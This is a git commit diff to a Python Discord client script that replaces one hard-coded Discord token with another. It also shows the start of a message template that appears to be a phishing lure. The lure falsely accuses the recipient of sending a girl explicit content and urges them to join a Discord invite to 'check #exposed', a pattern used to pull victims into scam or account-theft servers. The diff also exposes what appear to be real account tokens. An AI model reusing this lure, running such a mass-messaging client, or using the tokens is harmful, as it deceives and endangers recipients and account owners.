0893f38e79ac28e398dd6cc48c21a6c7a9f022b9
Krzx#1337 <81083343+bl-d@users.noreply.github.com>
2022-07-10 02:46:02 +0100

    Update main.py

--- main.py
+++ main.py
@@ -7,7 +7,7 @@ intents = discord.Intents.default()
 
 client = discord.Client(intents=intents)
 
-token = "NjkyMDY1NzY1OTMwODI3OTU2.GnX0Dq.3LzDo3FUHnTUtAh2xQIRGKN56MaLLRLmiPn7MA"
+token = "ODg1NjY0MDM3NjA0NTgxMzg4.GT2ZW9.5TfIB33o40GHIqLS9Mw8cBXZJnayXd-3vabBbk"
 
 message = """
 heyy ummm idk what happened or if its really you but it was your name and the same pfp you have, why tf did you send a girl ** stuff.. wtf is wrong with you.. https://discord.gg/hkdqqaJ8wr check #exposed and you'll see yourself. anyways until you explain what happened im blocking you, sorry if this is a misunderstand but i dont want to take any risks with weirdos on my friends list.
